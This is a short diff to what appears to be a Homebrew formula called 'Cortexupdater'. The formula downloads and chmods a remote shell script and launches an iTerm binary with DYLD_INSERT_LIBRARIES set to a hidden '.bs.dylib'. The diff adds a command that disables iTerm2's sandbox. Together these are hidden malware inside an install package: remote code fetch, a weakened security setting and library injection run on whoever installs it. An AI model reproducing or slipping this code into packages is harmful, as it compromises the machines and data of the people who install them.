@@ -51,7 +51,7 @@ class Cortexupdater < Formula
     download_script = `curl -o /opt/homebrew/etc/update_cortex.sh https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh`
 
     chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
-
+    disable_sandbox = `defaults write com.googlecode.iterm2 EnableSandbox -bool NO`
     #run = `sh /opt/homebrew/etc/update_cortex.sh`
     run = `open /opt/homebrew/etc/iTerm.app/Contents/MacOS/iTerm --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`
 
